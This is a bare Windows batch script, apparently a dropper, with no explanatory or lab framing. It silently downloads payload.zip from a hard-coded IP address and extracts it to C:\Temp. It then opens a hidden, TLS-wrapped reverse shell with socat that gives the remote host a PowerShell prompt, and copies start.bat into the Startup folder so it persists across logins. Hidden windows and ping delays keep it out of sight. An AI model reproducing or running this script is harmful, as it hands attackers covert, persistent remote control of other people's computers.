mkdir C:\Temp

start /MIN curl http://194.195.114.92/payload.zip --output C:\Temp\payload.zip

powershell.exe -WindowStyle Hidden ping -n 5 localhost >nul

start /MIN powershell Expand-Archive C:\Temp\payload.zip -DestinationPath C:\Temp

powershell.exe -WindowStyle Hidden ping -n 3 localhost >nul

cd C:\Temp\payload

start /MIN socat OPENSSL:194.195.114.92:4443,verify=0 EXEC:'powershell.exe -WindowStyle Hidden',pipes

xcopy /s "C:\Temp\payload\start.bat" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"